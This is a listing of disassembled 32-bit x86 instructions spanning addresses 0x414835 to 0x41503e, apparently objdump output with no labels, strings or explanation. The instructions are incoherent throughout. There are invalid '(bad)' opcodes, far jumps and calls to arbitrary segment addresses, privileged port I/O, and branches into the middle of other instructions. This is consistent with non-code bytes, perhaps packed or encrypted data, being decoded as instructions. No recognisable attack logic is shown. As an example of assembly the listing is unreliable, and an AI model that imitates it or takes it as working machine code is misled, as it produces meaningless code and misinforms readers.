  414835:	fdiv   st,st(1)
  414837:	add    ebx,ebx
  414839:	sbb    ebp,esi
  41483b:	jp     0x41485e
  41483d:	int    0x61
  41483f:	inc    esp
  414840:	pop    esi
  414841:	pusha  
  414842:	sbb    DWORD PTR [ebp+ecx*4-0x42],esi
  414846:	iret   
  414847:	jp     0x4147ce
  414849:	pop    esi
  41484a:	cs loopne 0x4148ae
  41484d:	retf   0x877a
  414850:	jne    0x41481b
  414852:	jmp    0x321b:0xf5f52678
  414859:	inc    esp
  41485a:	jmp    0x419c:0x39ddc803
  414861:	mov    edx,0x99e603e9
  414866:	pause  
  414868:	and    bl,BYTE PTR [edx+esi*8+0x1c2e9303]
  41486f:	dec    edi
  414870:	jmp    0x41483c
  414872:	cmp    BYTE PTR [edi+0x62],0xd9
  414876:	jmp    0xfde748f5
  41487b:	cmc    
  41487c:	repnz or BYTE PTR [ebp+0x35],dl
  414880:	adc    BYTE PTR [edi],0x4f
  414883:	jecxz  0x414820
  414885:	rcr    ch,0xe9
  414888:	add    ebx,ebx
  41488a:	mov    eax,ds:0xc8915095
  41488f:	mov    esi,0x2b5e49df
  414894:	mul    BYTE PTR [ecx+0x51a6bbc4]
  41489a:	jno    0x414891
  41489c:	inc    ebx
  41489d:	bound  edx,QWORD PTR [edi+ebx*1+0x7c]
  4148a1:	pop    esp
  4148a2:	mov    cl,0x2f
  4148a4:	aam    0xcd
  4148a6:	enter  0xd5c1,0x50
  4148aa:	fnsave [edi+0x11fcbc3]
  4148b0:	xor    DWORD PTR [ebp+0x2196f185],0xffffffd9
  4148b7:	push   edi
  4148b8:	push   ebx
  4148b9:	bound  edx,QWORD PTR [esp+eax*2-0x1b]
  4148bd:	xor    esi,eax
  4148bf:	xor    al,0xd6
  4148c1:	test   ch,al
  4148c3:	push   ss
  4148c4:	xchg   ecx,eax
  4148c5:	pop    ebp
  4148c6:	sbb    DWORD PTR [ecx],eax
  4148c8:	je     0x414909
  4148ca:	rol    DWORD PTR [edi+0x34],1
  4148cd:	fsubr  DWORD PTR [esi+edx*2]
  4148d0:	inc    ebx
  4148d1:	arpl   WORD PTR [esi+edx*2],bp
  4148d4:	scas   al,BYTE PTR es:[edi]
  4148d5:	xor    bh,ch
  4148d7:	xor    BYTE PTR [esi-0x61cf02ce],ah
  4148dd:	add    BYTE PTR [ebp+eax*8+0x16],cl
  4148e1:	test   eax,0x60011965
  4148e6:	mov    ebp,ds
  4148e8:	test   DWORD PTR [ecx-0x50781f8b],ebp
  4148ee:	(bad)  
  4148f0:	add    cl,ch
  4148f2:	popa   
  4148f3:	mov    dl,0xb9
  4148f5:	cmp    DWORD PTR [ecx+0x26],esp
  4148f8:	pop    ebx
  4148f9:	les    ebx,FWORD PTR [edx-0x5016ee65]
  4148ff:	push   edx
  414900:	repnz inc ecx
  414902:	xor    eax,0xe2e9fcc8
  414907:	inc    esi
  414908:	add    eax,0xfbd435e9
  41490d:	mov    bh,0xfd
  41490f:	les    edx,FWORD PTR [esi]
  414911:	lea    esp,[ebp+0x19]
  414914:	add    DWORD PTR [edx+0x4c],ebp
  414917:	fld    QWORD PTR [eax]
  414919:	push   0xfffffffc
  41491b:	(bad)  
  41491c:	jo     0x414910
  41491e:	push   es
  41491f:	paddb  mm7,mm4
  414922:	xor    eax,0xe2e940ec
  414927:	inc    BYTE PTR [eax]
  414929:	add    ch,bh
  41492b:	cwde   
  41492c:	push   ebx
  41492d:	mov    edi,DWORD PTR [edx-0x34f784a8]
  414933:	test   DWORD PTR [edi],0xfdc435ff
  414939:	adc    eax,0x40d6d7
  41493e:	or     dh,ah
  414940:	or     BYTE PTR [eax],al
  414942:	add    BYTE PTR [ebp-0x66],cl
  414945:	jl     0x414933
  414947:	xchg   ebx,eax
  414948:	fiadd  DWORD PTR [eax]
  41494a:	add    bl,ah
  41494c:	(bad)  
  41494e:	dec    esp
  41494f:	pop    es
  414950:	sub    DWORD PTR [edx-0x44a9864],ecx
  414956:	(bad)  
  414957:	jnp    0x41496e
  414959:	push   esi
  41495a:	sbb    eax,0xffffffd9
  41495d:	mov    ebp,0x80cefc00
  414962:	jbe    0x27c63cdd
  414968:	sbb    edi,esp
  41496a:	(bad)  
  41496b:	cmp    eax,edi
  41496d:	mov    ecx,esi
  41496f:	aaa    
  414970:	lds    edi,FWORD PTR [ebx-0x31]
  414973:	dec    ebx
  414974:	fild   DWORD PTR [eax-0x1b41d00]
  41497a:	(bad)  
  41497b:	mov    esp,0xcb248574
  414980:	fild   DWORD PTR [eax]
  414982:	add    BYTE PTR [edx],cl
  414984:	loope  0x414986
  414986:	push   edi
  414987:	and    ebp,ebx
  414989:	bound  eax,QWORD PTR [ebx+edi*8+0x7d]
  41498d:	mov    ch,0x24
  41498f:	arpl   dx,bx
  414991:	add    BYTE PTR [eax],al
  414993:	jb     0x41492b
  414995:	cwde   
  414996:	inc    eax
  414997:	sti    
  414998:	loop   0x414972
  41499a:	popf   
  41499b:	mov    ebx,0xa7b4fdda
  4149a0:	mov    esi,0xb062fffb
  4149a5:	push   0x70ef00cc
  4149aa:	add    BYTE PTR ds:0xfd4ff11e,cl
  4149b0:	xor    al,0xbc
  4149b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149b3:	adc    ebp,esi
  4149b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149b6:	inc    eax
  4149b7:	add    bl,bl
  4149b9:	jle    0x4149b3
  4149bb:	and    BYTE PTR [edx-0x5dcdf7db],0xa9
  4149c2:	cld    
  4149c3:	(bad)  
  4149c4:	xchg   ebp,eax
  4149c5:	mov    al,0x39
  4149c7:	push   0x66
  4149c9:	and    eax,0xe16e2451
  4149ce:	sub    cl,BYTE PTR [ebx+0x12]
  4149d1:	jg     0x414a1c
  4149d3:	and    al,0x42
  4149d5:	mov    cl,0x0
  4149d7:	add    BYTE PTR [edx+0x77],ah
  4149da:	cli    
  4149db:	mov    bh,0x4f
  4149dd:	lock add al,0xe8
  4149e0:	sbb    eax,0xe90000a8
  4149e5:	lods   al,BYTE PTR ds:[esi]
  4149e6:	push   eax
  4149e7:	adc    esp,DWORD PTR [edx+0x620061b0]
  4149ed:	mov    al,0x60
  4149ef:	cmp    al,0x66
  4149f1:	int    0xd
  4149f3:	call   0x41e23d
  4149f8:	out    0x6f,al
  4149fa:	sbb    DWORD PTR [esi-0x29],edi
  4149fd:	jae    0x4149e3
  4149ff:	lss    esi,FWORD PTR ds:0x804b2449
  414a06:	mov    DWORD PTR [esi+eax*2-0x38],0x500ff00
  414a0e:	mov    al,0x9f
  414a10:	adc    esi,DWORD PTR [esi-0x20ffbf5e]
  414a16:	out    dx,eax
  414a17:	sbb    DWORD PTR [edx-0x56],esp
  414a1a:	test   BYTE PTR [eax+eax*1],0x62
  414a1e:	fchs   
  414a20:	inc    edi
  414a21:	xchg   cl,ch
  414a23:	jmp    0x26c9:0xf9fd1e45
  414a2a:	ffree  st(4)
  414a2c:	add    ebx,ecx
  414a2e:	sbb    al,0xce
  414a30:	call   0xf4171062
  414a35:	push   edx
  414a36:	sbb    edx,ebp
  414a38:	mov    WORD PTR [esi],fs
  414a3a:	std    
  414a3b:	(bad)  [eax+0x2e264ca2]
  414a41:	ins    DWORD PTR es:[edi],dx
  414a42:	push   esp
  414a43:	es call 0x810f7bb6
  414a49:	and    bl,cl
  414a4b:	cmp    DWORD PTR [ebx+0x43dc2571],esp
  414a51:	bound  edx,QWORD PTR [edx+0x26]
  414a54:	call   0xfefa4b2
  414a59:	fstp   DWORD PTR [esi+eiz*8]
  414a5c:	call   0x43c70b5e
  414a61:	bound  ebp,QWORD PTR [ecx]
  414a63:	fwait
  414a64:	clc    
  414a65:	loope  0x414a4e
  414a67:	sub    DWORD PTR [ebx+ebx*8],eax
  414a6a:	sbb    eax,0x58b0f3c6
  414a6f:	stos   BYTE PTR es:[edi],al
  414a70:	test   BYTE PTR [eax],0xad
  414a73:	push   esi
  414a74:	es call 0x19b473d3
  414a7a:	pop    edx
  414a7b:	les    edx,FWORD PTR [ebx+0x1dfde686]
  414a81:	add    eax,0x17e9d962
  414a86:	ins    DWORD PTR es:[edi],dx
  414a87:	cs push ebx
  414a89:	push   edi
  414a8a:	inc    esi
  414a8b:	add    eax,0xc46203e9
  414a90:	jle    0x414a79
  414a92:	cmp    edx,ebx
  414a94:	jmp    0x18d419c
  414a99:	loope  0x414a5b
  414a9b:	scas   al,BYTE PTR es:[edi]
  414a9c:	xor    BYTE PTR [ecx],0x5e
  414a9f:	dec    eax
  414aa0:	aaa    
  414aa1:	ins    BYTE PTR es:[edi],dx
  414aa2:	sbb    al,0x49
  414aa4:	lfs    eax,FWORD PTR [edi-0x1dea9716]
  414aab:	sbb    DWORD PTR [ecx],eax
  414aad:	push   cs
  414aae:	imul   edx,ecx,0xfffffffb
  414ab1:	push   ds
  414ab2:	in     al,0xc1
  414ab4:	add    dh,BYTE PTR [ebp+edi*4-0x3b]
  414ab8:	mov    ch,0xcd
  414aba:	and    esp,eax
  414abc:	cld    
  414abd:	jmp    0x2966d8c2
  414ac2:	popa   
  414ac3:	fld    DWORD PTR [eax]
  414ac5:	push   ebx
  414ac6:	pop    esi
  414ac7:	das    
  414ac8:	add    esi,edx
  414aca:	push   0xf5f4fbd1
  414acf:	out    0x40,eax
  414ad1:	jmp    0x34440cbc
  414ad6:	add    BYTE PTR [edx+0x4f],ch
  414ad9:	rol    edx,0x59
  414adc:	push   edx
  414add:	retf   
  414ade:	shl    DWORD PTR [ecx],0xc3
  414ae1:	cld    
  414ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ae3:	xor    al,0x84
  414ae5:	pop    esi
  414ae6:	mov    al,ds:0x4ead8222
  414aec:	ret    
  414aed:	cld    
  414aee:	jmp    0x18423012
  414af3:	ja     0x414b47
  414af5:	pop    ebp
  414af6:	lds    esi,FWORD PTR [ecx]
  414af8:	daa    
  414af9:	push   ebx
  414afa:	bound  ecx,QWORD PTR [edx-0x3]
  414afd:	adc    al,0x64
  414aff:	out    0x80,eax
  414b01:	add    ecx,ebp
  414b03:	sbb    ecx,0x2dd9a50b
  414b09:	mov    ah,BYTE PTR [ebp+0x5785d405]
  414b0f:	push   0xffffffd3
  414b11:	data16 add bl,dh
  414b14:	cmc    
  414b15:	add    BYTE PTR [esi+0x34],dl
  414b18:	int3   
  414b19:	pusha  
  414b1a:	push   ss
  414b1b:	mov    ebx,0x7c481d7
  414b20:	lock add BYTE PTR [eax],dl
  414b23:	retf   
  414b24:	xlat   BYTE PTR ds:[ebx]
  414b25:	xor    ebp,ebp
  414b27:	push   cs
  414b28:	jns    0x414b5a
  414b2a:	dec    eax
  414b2b:	hlt    
  414b2c:	sbb    eax,DWORD PTR [ecx]
  414b2e:	dec    esi
  414b30:	arpl   WORD PTR [ecx],dx
  414b32:	inc    eax
  414b33:	retf   
  414b34:	push   esp
  414b35:	stc    
  414b36:	test   DWORD PTR [eax+ebp*8-0x44ff687c],esi
  414b3d:	xlat   BYTE PTR ds:[ebx]
  414b3e:	add    BYTE PTR [ebx+0x1cbc37],al
  414b44:	aas    
  414b45:	into   
  414b46:	push   0x0
  414b48:	mov    ah,0xeb
  414b4a:	and    al,0x24
  414b4c:	mov    ah,0xca
  414b4e:	test   BYTE PTR [edx],dl
  414b50:	cmp    ebx,ebp
  414b52:	aaa    
  414b53:	add    cl,BYTE PTR [edx+0x107500d7]
  414b59:	push   esp
  414b5a:	inc    ebp
  414b5b:	and    al,0x97
  414b5d:	pop    es
  414b5e:	mov    al,BYTE PTR [edi+ebx*2-0x3f]
  414b62:	mov    bl,0x0
  414b64:	pop    ebx
  414b65:	xlat   BYTE PTR ds:[ebx]
  414b66:	add    BYTE PTR [ecx-0x74],dl
  414b69:	js     0x414bdc
  414b6b:	or     dl,al
  414b6d:	adc    ah,BYTE PTR ds:0xb8cbd42c
  414b73:	adc    eax,0xc07fdd8b
  414b78:	das    
  414b79:	adc    eax,0xc31f448a
  414b7e:	jg     0x414b40
  414b80:	das    
  414b81:	mov    ds:0x7440e801,al
  414b86:	jbe    0x414bc4
  414b88:	jle    0x414bea
  414b8a:	jne    0x414b3f
  414b8c:	bound  esi,QWORD PTR [edi]
  414b8e:	cmp    al,BYTE PTR [ecx+eiz*2]
  414b91:	add    BYTE PTR [ebp-0x3122f532],cl
  414b97:	push   ebp
  414b99:	cmp    al,0xc0
  414b9b:	je     0x414bd7
  414b9d:	or     edx,DWORD PTR [esp]
  414ba0:	add    BYTE PTR [esi+0x37],al
  414ba3:	or     al,BYTE PTR [ecx]
  414ba5:	and    al,0xb4
  414ba7:	cmp    DWORD PTR [eax-0x2b],edx
  414baa:	int    0x3c
  414bac:	push   ss
  414bad:	and    dh,BYTE PTR [eax-0x6781bb73]
  414bb3:	test   esp,eax
  414bb5:	outs   dx,BYTE PTR ds:[esi]
  414bb6:	mov    cl,0x4a
  414bb8:	add    al,0xc9
  414bba:	cmp    cl,BYTE PTR [ebp-0x2e044533]
  414bc0:	jmp    DWORD PTR [ebp+0x76e8ff00]
  414bc6:	inc    edi
  414bc7:	int3   
  414bc8:	call   0x47be6b
  414bcd:	out    0xa2,eax
  414bcf:	sbb    DWORD PTR ds:0xb7a8a2d9,eax
  414bd5:	lods   al,BYTE PTR ds:[esi]
  414bd6:	mov    cl,0x0
  414bd8:	xor    ah,BYTE PTR [edx+0x95b3ae3]
  414bde:	jmp    0x2fa358a1
  414be3:	mov    cl,0xc
  414be5:	mov    cl,0x2
  414be7:	rcr    al,1
  414be9:	mov    cl,0xe8
  414beb:	test   BYTE PTR [eax],al
  414bed:	bound  esi,QWORD PTR [eax-0x294efdd6]
  414bf3:	add    eax,0xb06268
  414bf8:	inc    eax
  414bf9:	xor    eax,0xdb2fe4cc
  414bfe:	sti    
  414bff:	call   0xa4ee712b
  414c04:	adc    al,BYTE PTR [eax]
  414c06:	mov    ds:0x128ae9d9,al
  414c0b:	push   esi
  414c0c:	pop    esp
  414c0d:	lahf   
  414c0e:	pop    edi
  414c0f:	pop    ebp
  414c10:	mov    eax,DWORD PTR [edx+eiz*2]
  414c13:	fnstenv [edx-0x16169dd5]
  414c19:	add    edx,DWORD PTR [ebx+0x6f4bf5c2]
  414c1f:	sbb    eax,0xc5519eea
  414c24:	fiadd  DWORD PTR [ebx+0x62]
  414c27:	dec    esi
  414c28:	and    cl,BYTE PTR [ecx+0x38a14cd7]
  414c2e:	fld    TBYTE PTR [ebp-0xe81c02f]
  414c34:	xchg   ebp,eax
  414c35:	icebp  
  414c36:	adc    al,dl
  414c38:	jle    0x414c21
  414c3a:	mov    edx,eax
  414c3c:	aad    0x8b
  414c3e:	push   eax
  414c3f:	sbb    edx,ebp
  414c41:	loopne 0x414ca6
  414c43:	fsubr  st,st(1)
  414c45:	add    edx,DWORD PTR [ecx]
  414c47:	sub    esi,DWORD PTR [ebp+0x47]
  414c4a:	ds jmp 0xfd67d789
  414c50:	icebp  
  414c51:	sub    esp,DWORD PTR [edx-0x17]
  414c54:	jmp    0x3b03635c
  414c59:	or     al,0x77
  414c5b:	jmp    0x414cda
  414c5d:	clc    
  414c5e:	sub    eax,0xeec36cd9
  414c63:	(bad)  
  414c64:	pop    esi
  414c65:	inc    edi
  414c66:	xchg   cl,ch
  414c68:	ins    BYTE PTR es:[edi],dx
  414c69:	ret    
  414c6a:	add    dh,cl
  414c6c:	repnz out 0xab,al
  414c6f:	int    0xbe
  414c71:	jmp    0x92ec:0x12da0203
  414c78:	dec    esi
  414c79:	ss call 0x375b76d8
  414c7f:	xchg   esp,eax
  414c80:	rol    BYTE PTR [ecx],0xdc
  414c83:	jmp    0xeb2a8d73
  414c88:	cdq    
  414c89:	jne    0x414c87
  414c8b:	call   0x293a71a5
  414c90:	sbb    eax,0x646df125
  414c95:	call   0x16ff847a
  414c9a:	(bad)  
  414c9c:	add    BYTE PTR [ecx],al
  414c9e:	jp     0x414d06
  414ca0:	push   edx
  414ca1:	int3   
  414ca2:	inc    ecx
  414ca3:	mov    bh,0x94
  414ca5:	add    ch,cl
  414ca7:	and    ah,BYTE PTR [edi]
  414ca9:	cld    
  414caa:	cld    
  414cab:	pop    ecx
  414cac:	jmp    0x414cee
  414cae:	jmp    0x9d19a23f
  414cb3:	push   esi
  414cb4:	push   edx
  414cb5:	dec    ebp
  414cb6:	lds    edi,FWORD PTR [ecx+0x63df89b8]
  414cbc:	fstp   DWORD PTR [edx+0x73]
  414cbf:	mov    al,ds:0x552d8022
  414cc4:	fwait
  414cc5:	or     eax,0xed525ae9
  414cca:	push   0xffffffd2
  414ccc:	loope  0x414c5b
  414cce:	xor    al,0x0
  414cd0:	shr    BYTE PTR [edx],cl
  414cd2:	push   ebx
  414cd3:	ds fcmovne st,st(0)
  414cd6:	mov    BYTE PTR [edx+edx*2],bl
  414cd9:	mov    cl,0xb9
  414cdb:	mov    DWORD PTR [esi-0x27],ebx
  414cde:	test   BYTE PTR [ecx+0x3481274a],ch
  414ce4:	enter  0x87db,0x34
  414ce8:	dec    esi
  414ce9:	dec    ebx
  414cea:	push   es
  414ceb:	push   0x24
  414ced:	aad    0xe7
  414cef:	jmp    0xf56d:0x96f8b6e2
  414cf6:	xchg   DWORD PTR [esi+0xf94bdf],ebx
  414cfc:	fsubr  st(7),st
  414cfe:	in     al,dx
  414cff:	push   DWORD PTR [esi]
  414d01:	aam    0xe8
  414d03:	jnp    0x414cb5
  414d05:	pop    esi
  414d06:	(bad)  
  414d07:	xor    esi,eax
  414d09:	push   eax
  414d0a:	shl    DWORD PTR [ecx+eiz*2+0x7],0xfe
  414d0f:	jne    0x414d6c
  414d11:	push   edx
  414d12:	into   
  414d13:	jmp    DWORD PTR [esi]
  414d15:	rcl    BYTE PTR [ecx+0x53],0xb8
  414d19:	pop    esp
  414d1a:	jo     0x414d0c
  414d1c:	xchg   ebx,eax
  414d1d:	test   al,0xf8
  414d1f:	jmp    FWORD PTR [ecx+edx*2]
  414d22:	shl    DWORD PTR [ecx+edi*8+0x28],0xfc
  414d27:	mov    bh,dh
  414d29:	outs   dx,DWORD PTR ds:[esi]
  414d2a:	jmp    0x11ddb97
  414d2f:	mov    edi,esi
  414d31:	imul   ebp,ecx,0x60
  414d34:	add    BYTE PTR [esi-0x24],bh
  414d37:	add    BYTE PTR [edx+0x5b5afe88],cl
  414d3d:	jb     0x414cda
  414d3f:	and    eax,0x6904ca00
  414d44:	adc    BYTE PTR ds:0xb6ff0115,cl
  414d4a:	ret    
  414d4b:	adc    DWORD PTR [eax-0x75],eax
  414d4e:	push   eax
  414d4f:	stc    
  414d50:	test   DWORD PTR [edi+eiz*8-0x12baaa98],ebp
  414d57:	sbb    al,0x9e
  414d59:	dec    ebx
  414d5a:	aad    0x55
  414d5c:	xor    esi,DWORD PTR [ebp-0x76cfefa4]
  414d62:	sbb    eax,DWORD PTR [ecx]
  414d64:	mov    esp,DWORD PTR [ebx-0x7b8b17aa]
  414d6a:	in     eax,dx
  414d6b:	add    al,0x10
  414d6d:	dec    ebx
  414d6e:	(bad)  [esi+0x8]
  414d71:	in     al,dx
  414d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d73:	inc    esp
  414d74:	jg     0x414dd8
  414d76:	in     al,dx
  414d77:	add    al,0xfd
  414d79:	push   edi
  414d7a:	dec    esp
  414d7b:	lock aas 
  414d7d:	bound  ecx,QWORD PTR [ebx-0x70]
  414d80:	xor    DWORD PTR [eax*8-0x1328af12],0xffffffe8
  414d88:	(bad)  
  414d8a:	out    0x59,al
  414d8c:	std    
  414d8d:	gs mov al,0x0
  414d90:	push   0x62
  414d92:	dec    ecx
  414d93:	cmp    al,0x24
  414d95:	data16 daa 
  414d97:	mov    bl,0x83
  414d99:	add    BYTE PTR [edx],ah
  414d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d9c:	push   cs
  414d9d:	aaa    
  414d9e:	xchg   esi,eax
  414d9f:	int3   
  414da0:	hlt    
  414da1:	or     al,0xa0
  414da3:	pop    esp
  414da4:	in     al,0xf
  414da6:	fisubr DWORD PTR [esi+edi*8-0x31c49a18]
  414dad:	call   0x40527c
  414db2:	sub    DWORD PTR [edi-0x3dc5ec63],eax
  414db8:	inc    eax
  414db9:	add    cl,ch
  414dbb:	idiv   BYTE PTR ds:0xc179155b
  414dc1:	push   ebx
  414dc2:	fxch   st(4)
  414dc4:	cs dec edi
  414dc6:	loope  0x414e15
  414dc8:	cwde   
  414dc9:	add    BYTE PTR [edi+eiz*2],dh
  414dcc:	mov    DWORD PTR [edi+0x6a],esi
  414dcf:	sub    al,BYTE PTR ds:0x35b8278b
  414dd5:	mov    ebx,DWORD PTR [edi]
  414dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dd8:	xor    eax,0x9807546a
  414ddd:	adc    ebx,DWORD PTR [esi-0x18ffbf63]
  414de3:	jo     0x414df7
  414de5:	inc    esi
  414de6:	gs popf 
  414de8:	cmp    al,0x12
  414dea:	mov    ds:0xd8f883b0,al
  414def:	fstp   DWORD PTR [edi+ebx*8]
  414df2:	fimul  DWORD PTR [ebx]
  414df4:	mov    ds:0x8204ce45,al
  414df9:	adc    BYTE PTR [esi],ch
  414dfb:	fsubr  st,st(1)
  414dfd:	mov    es,WORD PTR [eax]
  414dff:	xor    dl,BYTE PTR [esp+edi*2+0x10]
  414e03:	js     0x414e38
  414e05:	jmp    0x8832:0x1ac1a188
  414e0c:	out    0x12,eax
  414e0e:	fwait
  414e0f:	jno    0x414da6
  414e11:	std    
  414e12:	inc    ebx
  414e13:	bound  ebx,QWORD PTR [edx+0x62]
  414e16:	add    eax,0x495ecf91
  414e1b:	outs   dx,BYTE PTR ds:[esi]
  414e1c:	push   esp
  414e1d:	and    DWORD PTR [eax],edx
  414e1f:	push   edx
  414e20:	push   edx
  414e21:	lods   eax,DWORD PTR ds:[esi]
  414e22:	fwait
  414e23:	in     eax,0xd7
  414e25:	dec    esi
  414e26:	or     eax,0x2a428edb
  414e2b:	scas   al,BYTE PTR es:[edi]
  414e2c:	xlat   BYTE PTR ds:[ebx]
  414e2d:	jmp    0x6f5f1e08
  414e32:	ret    0x902c
  414e35:	sub    BYTE PTR [eax],cl
  414e37:	bound  ebp,QWORD PTR [eax]
  414e39:	addr16 loopne 0x414dbd
  414e3c:	fnstenv [esi+0x6f260c30]
  414e42:	mov    esi,0x9b115213
  414e47:	push   ecx
  414e48:	jmp    0x52a39223
  414e4d:	repnz call 0xf526:0x8905f50e
  414e55:	cmc    
  414e56:	xor    esi,DWORD PTR [ebx]
  414e58:	xor    ebx,edx
  414e5a:	call   0x9551:0x9b34d962
  414e61:	fld    QWORD PTR [ebx+0x0]
  414e64:	bound  edx,QWORD PTR [edx+ebp*4+0x10]
  414e68:	add    BYTE PTR [esi-0x186223ff],bh
  414e6e:	inc    eax
  414e6f:	jmp    0x1cb91050
  414e74:	xchg   ecx,eax
  414e75:	push   edx
  414e76:	dec    ebp
  414e77:	lds    edx,FWORD PTR [ecx+0x2]
  414e7a:	cli    
  414e7b:	out    0xa0,al
  414e7d:	mov    es,WORD PTR [edx+0x15]
  414e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e81:	mov    cl,0xeb
  414e83:	mov    dl,0x66
  414e85:	fld    DWORD PTR [edi+0x75c3e279]
  414e8b:	sub    ebx,ebp
  414e8d:	push   cs
  414e8e:	add    bl,BYTE PTR [eax]
  414e90:	dec    ebp
  414e91:	and    edi,esp
  414e93:	cld    
  414e94:	ins    DWORD PTR es:[edi],dx
  414e95:	out    0x40,eax
  414e97:	jmp    0xf9666476
  414e9c:	fadd   DWORD PTR [ebp+0x25]
  414e9f:	in     eax,dx
  414ea0:	xor    DWORD PTR [ebx],esp
  414ea2:	imul   eax,DWORD PTR [esi-0x38],0xc89400d9
  414ea9:	call   0xd9632b72
  414eae:	jg     0x414ee1
  414eb0:	pop    esi
  414eb1:	dec    eax
  414eb2:	(bad)  
  414eb4:	and    eax,0x966418f5
  414eb9:	inc    ebp
  414eba:	add    esp,DWORD PTR [edx+0x7d]
  414ebd:	cmc    
  414ebe:	adc    BYTE PTR [eax+0x5e],ah
  414ec1:	push   edx
  414ec2:	ret    
  414ec3:	adc    bl,BYTE PTR [esi+0x52]
  414ec6:	retf   
  414ec7:	adc    DWORD PTR [eax],eax
  414ec9:	out    dx,eax
  414eca:	xchg   edx,eax
  414ecb:	add    ch,cl
  414ecd:	mov    ah,0x7c
  414ecf:	pop    esp
  414ed0:	(bad)  
  414ed1:	pop    edx
  414ed2:	and    bl,BYTE PTR [edx-0x55]
  414ed5:	pop    esi
  414ed6:	fst    DWORD PTR [ebp+0x72]
  414ed9:	mov    edx,0x648ded3c
  414ede:	fld    DWORD PTR [eax]
  414ee0:	bound  ebx,QWORD PTR [ebx+eiz*1+0xaaa0088]
  414ee7:	xor    dh,0x2f
  414eea:	pop    ss
  414eeb:	xor    bh,bh
  414eed:	lods   eax,DWORD PTR ds:[esi]
  414eee:	mov    al,ds:0x5344743e
  414ef3:	nop
  414ef4:	pusha  
  414ef5:	push   es
  414ef6:	(bad)  
  414ef7:	dec    BYTE PTR [ebx+0x6e046d13]
  414efd:	aam    0x61
  414eff:	mov    BYTE PTR [ebp-0x31],cl
  414f02:	push   es
  414f03:	test   BYTE PTR [ebp-0x51],bh
  414f06:	push   eax
  414f07:	js     0x414f05
  414f09:	shl    edx,cl
  414f0b:	test   edi,edi
  414f0d:	xchg   esp,eax
  414f0e:	pop    ecx
  414f0f:	shl    DWORD PTR [esp+ebp*1+0x61],0x70
  414f14:	cld    
  414f15:	xchg   esi,eax
  414f16:	sub    al,0x61
  414f18:	std    
  414f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f1a:	(bad)  
  414f1b:	(bad)  
  414f1c:	jne    0x414ebd
  414f1e:	and    ch,cl
  414f20:	add    BYTE PTR [ebx],cl
  414f22:	fcom   DWORD PTR [ebp-0x18]
  414f25:	or     BYTE PTR [edi+0x14700002],bh
  414f2b:	cmc    
  414f2c:	call   0xfccdf331
  414f31:	inc    DWORD PTR [eax-0x71]
  414f34:	jmp    0x119dfa1
  414f39:	pop    edi
  414f3a:	add    eax,0xcb04bf8f
  414f3f:	jmp    0x81f9:0x7948ec89
  414f46:	push   edi
  414f47:	mov    ebp,0x54bb0006
  414f4c:	gs and al,0x8f
  414f4f:	xlat   BYTE PTR ds:[ebx]
  414f50:	push   ecx
  414f51:	push   esi
  414f52:	adc    DWORD PTR ss:0x3f36b30c,esp
  414f59:	add    bh,BYTE PTR [ebx+0x3b]
  414f5c:	shl    DWORD PTR [edx+eiz*2+0x24],0xad
  414f61:	fstp   QWORD PTR [edi]
  414f63:	mov    al,0x0
  414f65:	mov    DWORD PTR [edx-0x5e096aba],ecx
  414f6b:	mov    eax,ds:0x77e1030b
  414f70:	lock call 0x6d225
  414f76:	(bad)  
  414f77:	mov    edi,0xb1b499a8
  414f7c:	add    BYTE PTR [ebx-0x18077352],cl
  414f82:	ins    DWORD PTR es:[edi],dx
  414f83:	test   al,0xff
  414f85:	jmp    ecx
  414f87:	xchg   edi,edi
  414f89:	call   0x30691f5
  414f8e:	xchg   esi,eax
  414f8f:	mov    dh,0xa8
  414f91:	fild   DWORD PTR [eax]
  414f93:	bound  esi,QWORD PTR [eax+0x36018100]
  414f99:	lods   eax,DWORD PTR ds:[esi]
  414f9a:	cs or  al,0xf0
  414f9d:	sti    
  414f9e:	jae    0x415008
  414fa0:	sbb    BYTE PTR [ebp-0x1],al
  414fa3:	cmc    
  414fa4:	mov    al,0x85
  414fa6:	loope  0x414f91
  414fa8:	daa    
  414fa9:	stc    
  414faa:	cmc    
  414fab:	and    DWORD PTR [ecx+0xb],esi
  414fae:	xor    bh,ch
  414fb0:	je     0x414f8e
  414fb2:	bswap  edx
  414fb4:	xor    dh,al
  414fb6:	add    BYTE PTR [edx-0x18],ah
  414fb9:	stos   BYTE PTR es:[edi],al
  414fba:	punpckldq mm6,DWORD PTR [eax-0x3f79b37d]
  414fc1:	test   ecx,ecx
  414fc3:	and    bl,al
  414fc5:	pop    edx
  414fc6:	ret    0xb062
  414fc9:	fstp   st(5)
  414fcb:	cs sahf 
  414fcd:	aad    0xc6
  414fcf:	or     BYTE PTR [ebx+eax*4+0x3fa43e54],ch
  414fd6:	xchg   DWORD PTR [esi],ebp
  414fd8:	(bad)  ds:0x27097df0
  414fde:	add    ah,BYTE PTR [edx+0x4c]
  414fe1:	es loopne 0x41504d
  414fe4:	mov    cl,0xe7
  414fe6:	inc    ecx
  414fe7:	pusha  
  414fe8:	fldenv [ebx]
  414fea:	shl    DWORD PTR [ebp-0x465e90e2],cl
  414ff0:	xchg   edi,eax
  414ff1:	out    dx,al
  414ff2:	add    esp,edx
  414ff4:	sti    
  414ff5:	gs adc al,0x0
  414ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff9:	fld1   
  414ffb:	or     eax,0xd333238b
  415000:	and    bh,BYTE PTR ds:[ebx]
  415003:	das    
  415004:	retf   0xcd58
  415007:	inc    esp
  415008:	bound  esp,QWORD PTR [edx]
  41500a:	sbb    edx,DWORD PTR [edi+0x43d6cd51]
  415010:	bound  ecx,QWORD PTR [esi+0x7a]
  415013:	or     DWORD PTR [eax*2-0x115d435],0xbaac03e9
  41501e:	cmc    
  41501f:	mov    edx,DWORD PTR [eax+0x19]
  415022:	jmp    0x942e:0xe2452280
  415029:	mov    edx,0x195097dd
  41502e:	jmp    0x95f2:0x51e3df2d
  415035:	(bad)  [edx+0x6f23a335]
  41503b:	test   al,0xe3
  41503d:	lods   al,BYTE PTR ds:[esi]
  41503e:	fimul  DWORD PTR [eax+0x29bca911]
